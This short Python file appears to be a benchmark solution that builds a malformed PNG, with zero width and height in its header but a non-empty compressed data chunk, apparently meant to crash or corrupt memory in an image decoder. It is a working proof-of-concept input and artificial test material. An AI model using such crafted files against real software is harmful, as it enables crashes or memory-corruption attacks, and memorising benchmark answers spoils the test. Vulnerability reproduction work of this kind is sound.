import struct
import binascii
import zlib


class Solution:
    def solve(self, src_path: str) -> bytes:
        def make_chunk(chunk_type: bytes, data: bytes) -> bytes:
            length = struct.pack(">I", len(data))
            crc = binascii.crc32(chunk_type)
            crc = binascii.crc32(data, crc) & 0xFFFFFFFF
            return length + chunk_type + data + struct.pack(">I", crc)

        # PNG signature
        png_sig = b'\x89PNG\r\n\x1a\n'

        # IHDR with zero width and height
        ihdr_data = struct.pack(">IIBBBBB", 0, 0, 8, 2, 0, 0, 0)
        ihdr_chunk = make_chunk(b'IHDR', ihdr_data)

        # Compressed data that inflates to a non-zero size, triggering processing
        raw_data = b'\x00' * 4096
        compressed = zlib.compress(raw_data, level=9)
        idat_chunk = make_chunk(b'IDAT', compressed)

        # IEND chunk
        iend_chunk = make_chunk(b'IEND', b'')

        return png_sig + ihdr_chunk + idat_chunk + iend_chunk
